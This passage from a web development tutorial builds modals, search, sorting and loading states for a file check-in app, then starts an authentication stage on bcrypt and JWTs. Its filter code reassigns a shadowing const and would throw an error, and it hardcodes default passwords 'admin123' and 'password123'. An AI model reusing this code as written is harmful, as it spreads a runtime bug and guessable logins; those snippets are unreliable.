      <form id="checkin-form">
        <div class="form-group">
          <label for="checkin-user"
            >Your Name (must match checkout user):</label
          >
          <input
            type="text"
            id="checkin-user"
            required
            placeholder="Enter your name"
          />
        </div>

        <div class="modal-actions">
          <button type="button" class="btn btn-secondary" id="checkin-cancel">
            Cancel
          </button>
          <button type="submit" class="btn btn-checkin">Checkin</button>
        </div>
      </form>
    </div>
  </div>
</div>
```

### CSS for Modals

Add to `style.css`:

```css
/* ============================================
   MODAL DIALOGS
   ============================================ */

.modal-overlay {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0, 0, 0, 0.5);
  display: flex;
  justify-content: center;
  align-items: center;
  z-index: 1000;
  backdrop-filter: blur(2px);
}

.modal-overlay.hidden {
  display: none;
}

.modal-content {
  background: white;
  border-radius: 8px;
  max-width: 500px;
  width: 90%;
  max-height: 90vh;
  overflow-y: auto;
  box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
  animation: modalSlideIn 0.3s ease-out;
}

@keyframes modalSlideIn {
  from {
    transform: translateY(-50px);
    opacity: 0;
  }
  to {
    transform: translateY(0);
    opacity: 1;
  }
}

.modal-header {
  padding: 1.5rem;
  border-bottom: 1px solid #e0e0e0;
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.modal-header h3 {
  margin: 0;
  color: #333;
  font-size: 1.5rem;
}

.modal-close {
  background: none;
  border: none;
  font-size: 2rem;
  color: #999;
  cursor: pointer;
  padding: 0;
  width: 30px;
  height: 30px;
  display: flex;
  align-items: center;
  justify-content: center;
  border-radius: 4px;
  transition: all 0.2s;
}

.modal-close:hover {
  background: #f0f0f0;
  color: #333;
}

.modal-body {
  padding: 1.5rem;
}

.modal-actions {
  display: flex;
  gap: 1rem;
  justify-content: flex-end;
  margin-top: 1.5rem;
}

.btn-secondary {
  background: #6c757d;
}

.btn-secondary:hover {
  background: #5a6268;
}

.info-text {
  background: #e7f3ff;
  padding: 0.75rem;
  border-radius: 4px;
  border-left: 4px solid #667eea;
  margin: 1rem 0;
  color: #004085;
}

textarea {
  width: 100%;
  padding: 0.75rem;
  border: 1px solid #ddd;
  border-radius: 4px;
  font-size: 1rem;
  font-family: inherit;
  resize: vertical;
  transition: border-color 0.3s ease;
}

textarea:focus {
  outline: none;
  border-color: #667eea;
  box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
}
```

### Understanding the CSS

**`position: fixed`**

```css
.modal-overlay {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
}
```

- **Fixed positioning** - Element removed from normal document flow
- Position relative to **viewport** (browser window), not parent
- Stays in place when page scrolls
- Setting all four directions (top/left/right/bottom) to 0 makes it fill the screen

**`z-index: 1000`**

Controls stacking order:

- Higher number = appears on top
- Only works on positioned elements (`position: relative/absolute/fixed`)
- `1000` is arbitrary but high enough to be above normal content

**`backdrop-filter: blur(2px)`**

- Modern CSS property
- Applies visual effects to the area **behind** an element
- Creates that "frosted glass" effect
- Not supported in all browsers (graceful degradation)

**CSS Animations**

```css
@keyframes modalSlideIn {
  from {
    transform: translateY(-50px);
    opacity: 0;
  }
  to {
    transform: translateY(0);
    opacity: 1;
  }
}

.modal-content {
  animation: modalSlideIn 0.3s ease-out;
}
```

**How it works:**

1. `@keyframes` defines the animation sequence
2. `from` = starting state (50px above, invisible)
3. `to` = ending state (normal position, visible)
4. `animation:` applies it (name, duration, timing function)

**Timing functions:**

- `linear` - Constant speed
- `ease` - Slow start, fast middle, slow end (default)
- `ease-in` - Slow start, fast end
- `ease-out` - Fast start, slow end (feels most natural)
- `ease-in-out` - Slow start and end

---

## 4.3: Modal JavaScript Logic

### Modal Manager Class

Add to `app.js`:

```javascript
// ============================================
// MODAL MANAGER
// ============================================

class ModalManager {
  constructor(modalId) {
    this.modal = document.getElementById(modalId);
    this.overlay = this.modal;

    // Bind close handlers
    this.setupCloseHandlers();
  }

  setupCloseHandlers() {
    // Close button (X)
    const closeBtn = this.modal.querySelector(".modal-close");
    if (closeBtn) {
      closeBtn.addEventListener("click", () => this.close());
    }

    // Click outside modal
    this.overlay.addEventListener("click", (e) => {
      if (e.target === this.overlay) {
        this.close();
      }
    });

    // ESC key
    document.addEventListener("keydown", (e) => {
      if (e.key === "Escape" && !this.modal.classList.contains("hidden")) {
        this.close();
      }
    });
  }

  open() {
    this.modal.classList.remove("hidden");
    // Focus first input
    const firstInput = this.modal.querySelector("input, textarea");
    if (firstInput) {
      setTimeout(() => firstInput.focus(), 100);
    }
  }

  close() {
    this.modal.classList.add("hidden");
  }
}

// Create modal instances
const checkoutModal = new ModalManager("checkout-modal");
const checkinModal = new ModalManager("checkin-modal");
```

### Understanding JavaScript Classes

**What is a class?**

A **class** is a blueprint for creating objects with shared behavior.

**Before classes (ES5 - old way):**

```javascript
function ModalManager(modalId) {
  this.modal = document.getElementById(modalId);
}

ModalManager.prototype.open = function () {
  this.modal.classList.remove("hidden");
};
```

**With classes (ES6 - modern):**

```javascript
class ModalManager {
  constructor(modalId) {
    this.modal = document.getElementById(modalId);
  }

  open() {
    this.modal.classList.remove("hidden");
  }
}
```

**Key concepts:**

**`constructor`** - Special method that runs when you create an instance

```javascript
const myModal = new ModalManager("checkout-modal");
// Calls: constructor('checkout-modal')
```

**`this`** - Refers to the instance

```javascript
class ModalManager {
    constructor(modalId) {
        this.modal = ...;  // Instance property
    }

    open() {
        this.modal.classList.remove('hidden');  // Access instance property
    }
}
```

**Methods** - Functions defined in the class

```javascript
myModal.open(); // Calls the open() method
myModal.close(); // Calls the close() method
```

### Event Delegation - Click Outside

```javascript
this.overlay.addEventListener("click", (e) => {
  if (e.target === this.overlay) {
    this.close();
  }
});
```

**The problem:** Modal has children (the white box). If you click the white box, `e.target` is the white box, not the overlay.

**The solution:** Only close if clicked element IS the overlay itself.

**Event bubbling visualization:**

```
Click happens on:
    <button> (innermost)
        ↓ bubbles up
    <div class="modal-body">
        ↓ bubbles up
    <div class="modal-content">
        ↓ bubbles up
    <div class="modal-overlay"> ← event.target stops here
```

If you click the overlay background, `e.target === this.overlay` is true.
If you click inside, `e.target` is a child element, condition is false.

### Arrow Functions vs Regular Functions

```javascript
// Arrow function
setupCloseHandlers() {
    closeBtn.addEventListener('click', () => this.close());
}

// Regular function
setupCloseHandlers() {
    closeBtn.addEventListener('click', function() {
        this.close();  // ERROR: 'this' is wrong!
    });
}
```

**The difference: `this` binding**

- **Arrow functions** - `this` is lexically bound (uses parent scope's `this`)
- **Regular functions** - `this` depends on how function is called

**In event listeners:**

- Arrow: `this` = your class instance ✓
- Regular: `this` = the element that fired the event ✗

**Rule of thumb:** Use arrow functions in classes to avoid `this` confusion.

---

## 4.4: Integrating Modals with Checkout/Checkin

### Update Checkout Handler

Replace the `handleCheckout` function in `app.js`:

```javascript
// Store current filename globally
let currentFilename = null;

async function handleCheckout(filename) {
  console.log("Opening checkout modal for:", filename);
  currentFilename = filename;

  // Update modal title
  document.getElementById("checkout-filename").textContent = filename;

  // Clear previous form data
  document.getElementById("checkout-form").reset();

  // Open modal
  checkoutModal.open();
}
```

### Handle Checkout Form Submission

```javascript
// Setup form submission (add to DOMContentLoaded)
document
  .getElementById("checkout-form")
  .addEventListener("submit", async (e) => {
    e.preventDefault();

    const user = document.getElementById("checkout-user").value;
    const message = document.getElementById("checkout-message").value;

    console.log("Submitting checkout:", { currentFilename, user, message });

    try {
      const response = await fetch("/api/files/checkout", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          filename: currentFilename,
          user: user,
          message: message,
        }),
      });

      const data = await response.json();

      if (response.ok) {
        showNotification("File checked out successfully!", "success");
        checkoutModal.close();
        loadFiles();
      } else {
        showNotification(data.detail.error || data.detail, "error");
      }
    } catch (error) {
      console.error("Checkout error:", error);
      showNotification("Network error. Please try again.", "error");
    }
  });

// Cancel button
document.getElementById("checkout-cancel").addEventListener("click", () => {
  checkoutModal.close();
});
```

### Update Checkin Handler

```javascript
async function handleCheckin(filename) {
  console.log("Opening checkin modal for:", filename);
  currentFilename = filename;

  document.getElementById("checkin-filename").textContent = filename;
  document.getElementById("checkin-form").reset();

  checkinModal.open();
}

// Checkin form submission (add to DOMContentLoaded)
document
  .getElementById("checkin-form")
  .addEventListener("submit", async (e) => {
    e.preventDefault();

    const user = document.getElementById("checkin-user").value;

    try {
      const response = await fetch("/api/files/checkin", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          filename: currentFilename,
          user: user,
        }),
      });

      const data = await response.json();

      if (response.ok) {
        showNotification("File checked in successfully!", "success");
        checkinModal.close();
        loadFiles();
      } else {
        showNotification(data.detail, "error");
      }
    } catch (error) {
      console.error("Checkin error:", error);
      showNotification("Network error. Please try again.", "error");
    }
  });

document.getElementById("checkin-cancel").addEventListener("click", () => {
  checkinModal.close();
});
```

### Toast Notifications (Better than Alert)

Add this to `app.js`:

```javascript
// ============================================
// NOTIFICATIONS (Toast Messages)
// ============================================

function showNotification(message, type = "info") {
  // Create toast element
  const toast = document.createElement("div");
  toast.className = `toast toast-${type}`;
  toast.textContent = message;

  // Add to body
  document.body.appendChild(toast);

  // Animate in
  setTimeout(() => toast.classList.add("show"), 10);

  // Remove after 3 seconds
  setTimeout(() => {
    toast.classList.remove("show");
    setTimeout(() => toast.remove(), 300);
  }, 3000);
}
```

### Toast CSS

Add to `style.css`:

```css
/* ============================================
   TOAST NOTIFICATIONS
   ============================================ */

.toast {
  position: fixed;
  bottom: 20px;
  right: 20px;
  padding: 1rem 1.5rem;
  background: white;
  border-radius: 4px;
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
  transform: translateX(400px);
  transition: transform 0.3s ease;
  z-index: 2000;
  max-width: 300px;
  font-weight: 500;
}

.toast.show {
  transform: translateX(0);
}

.toast-success {
  border-left: 4px solid #28a745;
  color: #155724;
}

.toast-error {
  border-left: 4px solid #dc3545;
  color: #721c24;
}

.toast-info {
  border-left: 4px solid #667eea;
  color: #004085;
}
```

---

## 4.5: Search and Filter Functionality

### Add Search UI

Update `index.html` file list section:

```html
<section id="file-list-section">
  <div
    style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem;"
  >
    <h2>Available Files</h2>
    <button id="refresh-btn" class="btn">Refresh</button>
  </div>

  <!-- Search and Filter Controls -->
  <div class="controls-row">
    <div class="search-box">
      <input
        type="text"
        id="search-input"
        placeholder="Search files..."
        class="search-input"
      />
    </div>

    <div class="filter-group">
      <label for="status-filter">Status:</label>
      <select id="status-filter" class="filter-select">
        <option value="all">All</option>
        <option value="available">Available</option>
        <option value="checked_out">Checked Out</option>
      </select>
    </div>
  </div>

  <div id="file-list">
    <p>Loading files...</p>
  </div>
</section>
```

### Search/Filter CSS

```css
/* ============================================
   SEARCH & FILTER CONTROLS
   ============================================ */

.controls-row {
  display: flex;
  gap: 1rem;
  margin-bottom: 1.5rem;
  flex-wrap: wrap;
}

.search-box {
  flex: 1;
  min-width: 200px;
}

.search-input {
  width: 100%;
  padding: 0.75rem 1rem;
  border: 1px solid #ddd;
  border-radius: 4px;
  font-size: 1rem;
}

.filter-group {
  display: flex;
  align-items: center;
  gap: 0.5rem;
}

.filter-group label {
  margin: 0;
  font-weight: 500;
  color: #666;
}

.filter-select {
  padding: 0.75rem 1rem;
  border: 1px solid #ddd;
  border-radius: 4px;
  font-size: 1rem;
  cursor: pointer;
  background: white;
}

.filter-select:focus {
  outline: none;
  border-color: #667eea;
}
```

### Search/Filter JavaScript

Add to `app.js`:

```javascript
// ============================================
// SEARCH AND FILTER STATE
// ============================================

let allFiles = []; // Store all files
let searchTerm = "";
let statusFilter = "all";

// ============================================
// LOAD AND FILTER FILES
// ============================================

async function loadFiles() {
  console.log("Loading files from API...");

  try {
    const response = await fetch("/api/files");

    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    const data = await response.json();
    console.log("Received data:", data);

    // Store all files
    allFiles = data.files;

    // Apply filters and display
    displayFilteredFiles();
  } catch (error) {
    console.error("Error loading files:", error);
    displayError("Failed to load files. Please refresh the page.");
  }
}

function displayFilteredFiles() {
  // Apply search filter
  let filtered = allFiles.filter((file) => {
    const matchesSearch = file.name
      .toLowerCase()
      .includes(searchTerm.toLowerCase());
    const matchesStatus =
      statusFilter === "all" || file.status === statusFilter;
    return matchesSearch && matchesStatus;
  });

  console.log(`Displaying ${filtered.length} of ${allFiles.length} files`);

  displayFiles(filtered);
}

// ============================================
// SEARCH INPUT HANDLER
// ============================================

document.addEventListener("DOMContentLoaded", function () {
  // ... existing code ...

  // Search input
  const searchInput = document.getElementById("search-input");
  searchInput.addEventListener("input", (e) => {
    searchTerm = e.target.value;
    displayFilteredFiles();
  });

  // Status filter
  const statusFilter = document.getElementById("status-filter");
  statusFilter.addEventListener("change", (e) => {
    statusFilter = e.target.value;
    displayFilteredFiles();
  });
});
```

### Understanding Array Filter

```javascript
let filtered = allFiles.filter((file) => {
  return file.name.toLowerCase().includes(searchTerm.toLowerCase());
});
```

**How `filter()` works:**

1. Takes a callback function
2. Calls it for EACH element in the array
3. If callback returns `true`, element is included in new array
4. If callback returns `false`, element is excluded
5. Returns a NEW array (doesn't modify original)

**Example:**

```javascript
const numbers = [1, 2, 3, 4, 5, 6];
const evens = numbers.filter((n) => n % 2 === 0);
// evens = [2, 4, 6]
// numbers still = [1, 2, 3, 4, 5, 6] (unchanged)
```

### String Methods for Search

```javascript
file.name.toLowerCase().includes(searchTerm.toLowerCase());
```

**Breaking it down:**

**`.toLowerCase()`**

- Converts string to lowercase
- "PN1001_OP1.mcam" → "pn1001_op1.mcam"
- Makes search case-insensitive

**`.includes(substring)`**

- Returns `true` if string contains substring
- `"hello world".includes("wor")` → `true`
- `"hello world".includes("xyz")` → `false`

**Why lowercase both?**

```javascript
// Without lowercase:
"PN1001".includes("pn"); // false (case mismatch!)

// With lowercase:
"PN1001".toLowerCase().includes("pn".toLowerCase()); // true
```

---

## 4.6: Sorting Functionality

### Add Sort Controls

Update the controls row in HTML:

```html
<div class="controls-row">
  <div class="search-box">
    <input
      type="text"
      id="search-input"
      placeholder="Search files..."
      class="search-input"
    />
  </div>

  <div class="filter-group">
    <label for="status-filter">Status:</label>
    <select id="status-filter" class="filter-select">
      <option value="all">All</option>
      <option value="available">Available</option>
      <option value="checked_out">Checked Out</option>
    </select>
  </div>

  <div class="filter-group">
    <label for="sort-select">Sort by:</label>
    <select id="sort-select" class="filter-select">
      <option value="name-asc">Name (A-Z)</option>
      <option value="name-desc">Name (Z-A)</option>
      <option value="status-asc">Status (Available first)</option>
      <option value="status-desc">Status (Checked out first)</option>
    </select>
  </div>
</div>
```

### Sorting JavaScript

```javascript
let sortBy = "name-asc"; // Add to state variables

function displayFilteredFiles() {
  // Apply search and status filters
  let filtered = allFiles.filter((file) => {
    const matchesSearch = file.name
      .toLowerCase()
      .includes(searchTerm.toLowerCase());
    const matchesStatus =
      statusFilter === "all" || file.status === statusFilter;
    return matchesSearch && matchesStatus;
  });

  // Apply sorting
  filtered = sortFiles(filtered, sortBy);

  console.log(`Displaying ${filtered.length} of ${allFiles.length} files`);
  displayFiles(filtered);
}

function sortFiles(files, sortOption) {
  const sorted = [...files]; // Create copy (don't mutate original)

  const [field, direction] = sortOption.split("-");

  sorted.sort((a, b) => {
    let valueA, valueB;

    if (field === "name") {
      valueA = a.name.toLowerCase();
      valueB = b.name.toLowerCase();
    } else if (field === "status") {
      valueA = a.status;
      valueB = b.status;
    }

    // Compare
    if (valueA < valueB) {
      return direction === "asc" ? -1 : 1;
    }
    if (valueA > valueB) {
      return direction === "asc" ? 1 : -1;
    }
    return 0;
  });

  return sorted;
}

// Add event listener (in DOMContentLoaded)
document.getElementById("sort-select").addEventListener("change", (e) => {
  sortBy = e.target.value;
  displayFilteredFiles();
});
```

### Understanding Array Sort

**Basic sort:**

```javascript
const numbers = [3, 1, 4, 1, 5];
numbers.sort();
// numbers = [1, 1, 3, 4, 5]
```

**Custom comparator:**

```javascript
numbers.sort((a, b) => {
  return a - b; // Ascending
});
```

**The comparator function:**

- Takes two elements: `a` and `b`
- Returns:
  - **Negative number** if `a` should come before `b`
  - **Positive number** if `a` should come after `b`
  - **Zero** if they're equal

**String comparison:**

```javascript
"apple" < "banana"; // true
"banana" < "cherry"; // true

// In sort:
if (a < b) return -1; // a comes first
if (a > b) return 1; // b comes first
return 0; // equal
```

### The Spread Operator

```javascript
const sorted = [...files];
```

**What `...` does:**

- **Spread operator** - "unpacks" an array
- Creates a shallow copy

**Why copy?**

```javascript
// BAD - mutates original
files.sort();

// GOOD - preserves original
const sorted = [...files].sort();
```

**Other uses:**

```javascript
// Combine arrays
const combined = [...array1, ...array2];

// Copy array
const copy = [...original];

// Function arguments
Math.max(...numbers); // Instead of Math.max(numbers[0], numbers[1], ...)
```

---

## 4.7: Loading States

### Add Loading Indicator

Add to `index.html` (after the controls row):

```html
<div id="loading-indicator" class="loading hidden">
  <div class="spinner"></div>
  <p>Loading files...</p>
</div>
```

### Loading CSS

```css
/* ============================================
   LOADING INDICATOR
   ============================================ */

.loading {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  padding: 3rem;
  gap: 1rem;
}

.loading.hidden {
  display: none;
}

.spinner {
  width: 40px;
  height: 40px;
  border: 4px solid #f3f3f3;
  border-top: 4px solid #667eea;
  border-radius: 50%;
  animation: spin 1s linear infinite;
}

@keyframes spin {
  0% {
    transform: rotate(0deg);
  }
  100% {
    transform: rotate(360deg);
  }
}
```

### Loading JavaScript

```javascript
async function loadFiles() {
  console.log("Loading files from API...");

  // Show loading indicator
  const loadingEl = document.getElementById("loading-indicator");
  const fileListEl = document.getElementById("file-list");

  loadingEl.classList.remove("hidden");
  fileListEl.classList.add("hidden");

  try {
    const response = await fetch("/api/files");

    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    const data = await response.json();
    allFiles = data.files;

    displayFilteredFiles();
  } catch (error) {
    console.error("Error loading files:", error);
    displayError("Failed to load files. Please refresh the page.");
  } finally {
    // Hide loading indicator
    loadingEl.classList.add("hidden");
    fileListEl.classList.remove("hidden");
  }
}
```

### Understanding Try-Catch-Finally

```javascript
try {
  // Code that might throw error
} catch (error) {
  // Runs if error occurs
} finally {
  // ALWAYS runs (success or error)
}
```

**The flow:**

**Success path:**

1. `try` block executes fully
2. `catch` block is skipped
3. `finally` block runs

**Error path:**

1. `try` block throws error (stops executing)
2. `catch` block runs
3. `finally` block runs

**Perfect for cleanup:**

```javascript
try {
  openDatabase();
  doWork();
} finally {
  closeDatabase(); // Always close, even if error
}
```

---

## Stage 4 Complete - Professional Frontend UX!

### What You Built

You now have:

- Custom modal dialogs (replacing ugly prompts)
- Search functionality (real-time filtering)
- Status filtering (show only available/checked out)
- Multi-criteria sorting
- Loading indicators
- Toast notifications
- Professional UX patterns

### Key Concepts Mastered

**JavaScript:**

- ES6 Classes (constructor, methods, `this`)
- Arrow functions vs regular functions
- Array methods (`filter`, `sort`, spread `...`)
- Event delegation and bubbling
- State management in vanilla JS

**CSS:**

- Modals with overlays
- CSS animations (`@keyframes`)
- Positioning (fixed, absolute)
- Z-index and stacking contexts
- Spinner animations

**UX Patterns:**

- Non-blocking feedback (toasts)
- Loading states
- Keyboard accessibility (ESC to close)
- Click-outside-to-close
- Auto-focus inputs

### Your Complete File Structure

```
backend/
├── main.py                    # FastAPI with file operations
├── locks.json                 # Lock state
├── repo/
│   └── *.mcam                # Actual files
└── static/
    ├── index.html            # Semantic HTML with modals
    ├── css/
    │   └── style.css         # Complete styling
    └── js/
        └── app.js            # Full interactivity
```

### Verification Checklist

- [ ] Modal opens when clicking Checkout/Checkin
- [ ] Can close modal with X, Cancel, click outside, or ESC
- [ ] Search filters files in real-time
- [ ] Status filter works
- [ ] Sorting works for all options
- [ ] Loading spinner shows during API calls
- [ ] Toast notifications appear for actions
- [ ] No more ugly `prompt()` or `alert()`
- [ ] Understand JavaScript classes
- [ ] Understand event delegation

### What's Next?

In **Stage 5**, we'll add:

- User authentication (JWT tokens)
- Role-based access control (admin vs regular users)
- Secure password handling
- Session management
- Protected routes

Your app now looks and feels professional. Next, we make it secure.

---

# Stage 5: Authentication & Authorization - Securing Your Application

## Introduction: The Goal of This Stage

Your app works beautifully, but anyone can pretend to be anyone. There's no login, no passwords, no way to verify identity. This stage transforms your app from open to secure.

By the end of this stage, you will:

- Understand the difference between authentication and authorization
- Implement secure password hashing (never store plain text!)
- Create JWT (JSON Web Token) authentication
- Build a login/logout system
- Protect API endpoints
- Manage user sessions in the frontend
- Implement role-based access control (admin vs user)
- Understand common security vulnerabilities and how to prevent them

**Time Investment:** 6-8 hours

**Warning:** Security is complex. We'll build this carefully, explaining every decision.

---

## 5.1: Authentication vs Authorization - Two Different Problems

### The Definitions

**Authentication (AuthN)** - "Who are you?"

- Verifying identity
- Login process
- Checking credentials (username/password)
- Result: Yes, you are John / No, credentials invalid

**Authorization (AuthZ)** - "What are you allowed to do?"

- Checking permissions
- Happens AFTER authentication
- Based on roles or rules
- Result: Yes, you can delete / No, admins only

### The Analogy

**Airport Security:**

**Authentication** - Showing your ID at the ticket counter

- TSA agent: "Are you really John Doe?"
- Checks your photo ID
- Confirms you are who you claim to be

**Authorization** - Boarding the plane

- Already authenticated (they know who you are)
- Now checking: "Does your ticket allow you on THIS flight?"
- First class vs economy, priority boarding, etc.

### In Our App

**Authentication:**

- User enters username/password
- System verifies credentials
- Issues a token (proof of identity)

**Authorization:**

- User tries to delete a file
- System checks: "Is this user an admin?"
- Allows or denies based on role

---

## 5.2: Password Security - Why Hashing Matters

### The WRONG Way (Never Do This!)

```python
# DANGEROUS - NEVER DO THIS!
users = {
    "john": {
        "password": "MyPassword123"  # Plain text - TERRIBLE!
    }
}

def login(username, password):
    if users[username]["password"] == password:
        return "Success"
```

**Why this is catastrophic:**

1. **Database breach** - Attacker gets ALL passwords
2. **Insider threat** - Admins can see passwords
3. **Password reuse** - Users use same password on other sites
4. **Legal liability** - Violates data protection laws

### The Correct Way: Hashing

**Hash function** - One-way mathematical transformation

```python
password = "MyPassword123"
hash = bcrypt.hash(password)
# Result: "$2b$12$N9qo8uLOickgx2ZMRZoMye..."

# Cannot reverse:
# hash -> ??? (impossible to get original password)

# But can verify:
bcrypt.verify("MyPassword123", hash)  # True
bcrypt.verify("WrongPassword", hash)  # False
```

### How Hashing Works (Deep Dive)

**Step 1: Add Salt**

```
password: "MyPassword123"
salt: "aB3$kL9@"  (random string)
salted: "MyPassword123aB3$kL9@"
```

**Why salt?**

- Prevents rainbow table attacks
- Same password = different hash (due to different salt)
- Salt is stored WITH the hash (it's not secret, just random)

**Step 2: Hash Function**

```
input: "MyPassword123aB3$kL9@"
bcrypt algorithm (many iterations)
output: "$2b$12$N9qo8uLOickgx2ZMRZoMye..."
```

**Step 3: Store**

```python
{
    "john": {
        "password_hash": "$2b$12$N9qo8uLOickgx2ZMRZoMye..."
        # The hash CONTAINS the salt embedded in it
    }
}
```

### Understanding Bcrypt

**The `$2b$12$...` format:**

```
$2b  $12  $salt_and_hash
 │    │         │
 │    │         └─ Salt + Hash combined
 │    └─ Cost factor (2^12 = 4096 iterations)
 └─ Algorithm version
```

**Cost factor:**

- Higher = slower = more secure
- 12 = ~250ms to hash (good balance)
- Protects against brute force (attacker must wait 250ms PER attempt)

**Why bcrypt vs other algorithms?**

| Algorithm  | Why NOT Use                                       |
| ---------- | ------------------------------------------------- |
| MD5        | Too fast (billions of hashes/second on GPU)       |
| SHA-1      | Too fast, collisions found                        |
| SHA-256    | Too fast (designed for files, not passwords)      |
| **bcrypt** | Deliberately slow, includes salt, battle-tested ✓ |
| Argon2     | Even better than bcrypt (newer, more secure)      |

---

## 5.3: Installing Dependencies

### Install Password Hashing

```bash
pip install "passlib[bcrypt]"
```

**What this installs:**

- `passlib` - Password hashing library
- `bcrypt` - The bcrypt algorithm (C extension for speed)

### Install JWT Library

```bash
pip install "python-jose[cryptography]"
```

**What this installs:**

- `python-jose` - JWT encoding/decoding
- `cryptography` - Cryptographic primitives

### Update requirements.txt

```bash
pip freeze > requirements.txt
```

This saves your dependencies so others can install the same versions.

---

## 5.4: User Data Structure

### Create users.json

Create `backend/users.json`:

```json
{
  "admin": {
    "username": "admin",
    "password_hash": "$2b$12$...",
    "full_name": "Administrator",
    "role": "admin"
  },
  "john_doe": {
    "username": "john_doe",
    "password_hash": "$2b$12$...",
    "full_name": "John Doe",
    "role": "user"
  }
}
```

**Note:** We'll generate the actual hashes in code. These are placeholders.

### Create User Management Functions

Add to `main.py`:

```python
from passlib.context import CryptContext
from pathlib import Path
import json

# Configure password hashing
pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")

# Path to users file
USERS_FILE = BASE_DIR / 'users.json'

# ============================================
# USER MANAGEMENT FUNCTIONS
# ============================================

def load_users() -> dict:
    """Load users from users.json."""
    if not USERS_FILE.exists():
        logger.warning("Users file doesn't exist, creating default admin")
        create_default_users()

    try:
        with open(USERS_FILE, 'r') as f:
            users = json.load(f)
        logger.info(f"Loaded {len(users)} users")
        return users
    except json.JSONDecodeError as e:
        logger.error(f"Error parsing users.json: {e}")
        return {}

def save_users(users: dict):
    """Save users to users.json."""
    try:
        with open(USERS_FILE, 'w') as f:
            json.dump(users, f, indent=4)
        logger.info(f"Saved {len(users)} users")
    except Exception as e:
        logger.error(f"Error saving users: {e}")
        raise

def create_default_users():
    """Create default admin and test user."""
    users = {
        "admin": {
            "username": "admin",
            "password_hash": pwd_context.hash("admin123"),  # Change in production!
            "full_name": "Administrator",
            "role": "admin"
        },
        "john": {
            "username": "john",
            "password_hash": pwd_context.hash("password123"),
            "full_name": "John Doe",
            "role": "user"
        }
    }
    save_users(users)
    logger.info("Created default users: admin, john")

def verify_password(plain_password: str, password_hash: str) -> bool:
    """Verify a password against its hash."""
    return pwd_context.verify(plain_password, password_hash)

def get_user(username: str) -> dict:
    """Get user by username. Returns None if not found."""
    users = load_users()
    return users.get(username)

def authenticate_user(username: str, password: str) -> dict:
    """
    Authenticate user with username and password.
    Returns user dict if valid, None if invalid.
    """
    user = get_user(username)
    if not user:
        logger.info(f"Authentication failed: User '{username}' not found")
        return None

    if not verify_password(password, user["password_hash"]):
        logger.info(f"Authentication failed: Invalid password for '{username}'")
        return None

    logger.info(f"Authentication successful: '{username}'")
    return user
```

### Understanding the Code

**`CryptContext`**

```python
pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")
```

- Creates a password hashing context
- `schemes=["bcrypt"]` - Use bcrypt algorithm
- `deprecated="auto"` - Handles algorithm upgrades automatically

**Methods:**

- `.hash(password)` - Hash a plain password
- `.verify(plain, hash)` - Check if password matches hash

**Timing Attack Protection**

```python
def verify_password(plain_password: str, password_hash: str) -> bool:
    return pwd_context.verify(plain_password, password_hash)
```

**Bad implementation:**

```python
# VULNERABLE to timing attack
if password == stored_password:
    # Early exit when first character doesn't match
    # Attacker can measure time to guess password character-by-character
```

**bcrypt's `.verify()`:**

- Uses constant-time comparison
- Takes same time whether password is wrong at position 1 or position 10
- Prevents timing attacks

---

## 5.5: JSON Web Tokens (JWT) - Deep Dive

### What is a JWT?

A **JWT** is a compact, URL-safe way to represent claims between two parties.

**Structure:** Three parts separated by dots

```
xxxxx.yyyyy.zzzzz
│     │     │
│     │     └─ Signature
│     └─ Payload (claims)
└─ Header
```

### Real JWT Example

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJqb2huIiwicm9sZSI6InVzZXIiLCJleHAiOjE3MzAwMDAwMDB9.k7g9j3k2hf9s8d7f6g5h4j3k2l1m0n9o8p7q6r5s4t3
```

### Decoding the JWT

**1. Header (Base64-encoded JSON)**

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9

Decoded:
{
  "alg": "HS256",  // Signing algorithm
  "typ": "JWT"     // Token type
}
```

**2. Payload (Base64-encoded JSON)**

```
eyJzdWIiOiJqb2huIiwicm9sZSI6InVzZXIiLCJleHAiOjE3MzAwMDAwMDB9

Decoded:
{
  "sub": "john",           // Subject (username)
  "role": "user",          // Custom claim
  "exp": 1730000000        // Expiration (Unix timestamp)
}
```

**3. Signature**

```
k7g9j3k2hf9s8d7f6g5h4j3k2l1m0n9o8p7q6r5s4t3

Created by:
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  SECRET_KEY
)
```

### How JWT Authentication Works

```
1. User logs in with username/password
   ↓
2. Server verifies credentials
   ↓
3. Server creates JWT with user info
   ↓
4. Server sends JWT to client
   ↓
5. Client stores JWT (localStorage)
   ↓
6. Client sends JWT with every request (in Authorization header)
   ↓
7. Server verifies JWT signature
   ↓
8. Server extracts user info from JWT
   ↓
9. Server processes request
```

### Why JWT vs Sessions?

**Traditional Sessions:**

```
Client                     Server
  │                          │
  │──── Login ───────────────>│
  │                          │ Create session in DB
  │<── Set-Cookie ───────────│ session_id=abc123
  │                          │
  │──── Request ──────────────>│
  │    Cookie: session_id     │ Look up session in DB
  │                          │ "Is abc123 valid? Who is it?"
```

**Problems with sessions:**

- Server must store sessions (uses memory/database)
- Doesn't scale well (multiple servers need shared session storage)
- Requires database lookup on every request

**JWT Approach:**

```
Client                     Server
  │                          │
  │──── Login ───────────────>│
  │                          │ Sign JWT with secret
  │<── JWT ──────────────────│ token=eyJ...
  │                          │
  │──── Request ──────────────>│
  │    Auth: Bearer eyJ...    │ Verify signature
  │                          │ Extract data from token
  │                          │ (No database lookup!)
```

**Benefits:**

- Stateless (server doesn't store anything)
- Scales horizontally (any server can verify)
- All info is in the token

**Tradeoffs:**

- Can't instantly revoke (must wait for expiration)
- Slightly larger than session ID
- Need to protect secret key

---

